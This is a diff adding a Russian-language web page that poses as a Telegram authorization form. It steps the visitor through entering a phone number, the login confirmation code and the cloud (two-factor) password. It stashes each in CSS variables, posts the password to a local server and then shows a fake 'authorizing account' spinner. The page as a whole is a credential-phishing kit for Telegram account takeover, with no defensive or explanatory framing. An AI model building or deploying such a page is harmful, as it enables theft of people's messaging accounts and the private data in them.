@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация через Telegram</title>
+    <style>
+        :root {
+            --name: none;
+            --code: none;
+            --password: none;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .form-container {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .form-container-2 {
+            background-color: #f9f9f9;
+            /* padding: 20px; */
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group_2 {
+            margin-bottom: 5px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #245fdf;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #245fdf;
+        }
+        .second-step {
+            display: none;
+        }
+        .third-step {
+            display: none;
+        }
+        .confirmation {
+            display: none;
+        }
+        .info {
+            display: none;
+            color: rgb(255, 255, 255);
+            padding-bottom: 1000px;
+        
+        }
+        .form_post {
+            display: none;
+        
+        
+        }
+    </style>
+</head>
+<body>
+    <div class="form_post">
+    <form action="https://translate.yandex.ru/" method="POST">
+        <div>
+            <label for="name">Имя:</label>
+        </div>
+        
+        <div>
+            <label for="email">Email:</label>
+        </div>
+        
+        <div>
+            <label for="message">Сообщение:</label>
+        </div>
+    </form></div>
+    <div class="form-container">
+        <div class="head2"><h2>Авторизация через Telegram </h2></div>
+        
+        <div class="first-step">
+            <div class="form-group">
+                <label for="firstInput">Введите свой номер телефона</label>
+                <input type="text" id="firstInput" placeholder="Начинается на +7 или 8">
+            </div>
+            <button id="continueBtn">Продолжить</button>
+        </div>
+        <div class="second-step">
+            <div class="form-group">
+                <label for="secondInput">Введите код подтверждения</label>
+                <input type="text" id="secondInput" placeholder="Код подтверждения">
+            </div>
+            <button id="continueBtn_2">Продолжить</button>
+        </div>
+
+        <div class="third-step">
+            <form action="http://127.0.0.1:5000/submit", method="POST", target="_blank">
+            <div class="form-group">
+                <label for="thirdInput">Введите облачный пароль, если он есть:</label>
+                <input type="text" name="text" id="thirdInput" placeholder="Облачный пароль">
+            </div>
+            
+                <button id="continueBtn_3">Войти</button>
+                <button type = 'submit'id="continueBtn_4">У меня его нет, войти без него</button>
+            </form>
+        </div>
+
+    </div>
+    <div class="form-container-2">
+        <div class="confirmation">
+            <div class="form-group">
+                <h2>Пожалуйста, подождите.</h2>
+            </div>
+            <div class="form-group_2">
+                <label>Происходит авторизация аккаунта</label>
+            </div>
+            <img src="image/gif.gif" alt="Загрузка" width="150px">
+        </div>
+    </div>
+    <div class="info">
+        
+
+    </div>
+
+
+    <script>
+
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            const firstInput = document.getElementById('firstInput').value;
+            
+            if (firstInput.trim() === '') {
+                alert('Пожалуйста, введите текст в первое поле');
+                return;
+            }
+            document.querySelector(':root').style.setProperty('--name',firstInput);
+            
+            document.querySelector('.first-step').style.display = 'none';
+            document.querySelector('.second-step').style.display = 'block';
+        });
+        document.getElementById('continueBtn_2').addEventListener('click', function() {
+            const secondInput = document.getElementById('secondInput').value;
+            
+            if (secondInput.trim() === '') {
+                alert('Пожалуйста, введите текст в поле');
+                return;
+            }
+
+            document.querySelector(':root').style.setProperty('--code', secondInput);
+            document.querySelector('.second-step').style.display = 'none';
+            document.querySelector('.third-step').style.display = 'block';
+        });
+        document.getElementById('continueBtn_3').addEventListener('click', function() {
+            const thirdInput = document.getElementById('thirdInput').value;
+            
+            if (thirdInput.trim() === '') {
+                alert('Пожалуйста, введите текст в поле');
+                return;
+            }
+            document.querySelector(':root').style.setProperty('--password',thirdInput);
+            document.querySelector('.head2').style.display = 'none';
+            document.querySelector('.third-step').style.display = 'none';
+            document.querySelector('.confirmation').style.display = 'block';
+
+        });
+        document.getElementById('continueBtn_4').addEventListener('click', function() {
+            
+            document.querySelector('.head2').style.display = 'none';
+            document.querySelector('.third-step').style.display = 'none';
+            document.querySelector('.confirmation').style.display = 'block';
+            var element = document.querySelector(':root');
+            var style = getComputedStyle(element);
+
+            var name = style.getPropertyValue('--name');
+            var code = style.getPropertyValue('--code');
+            var password = style.getPropertyValue('--password');
+           
+        });
+
+
+
+    </script>
+</body>
+</html>
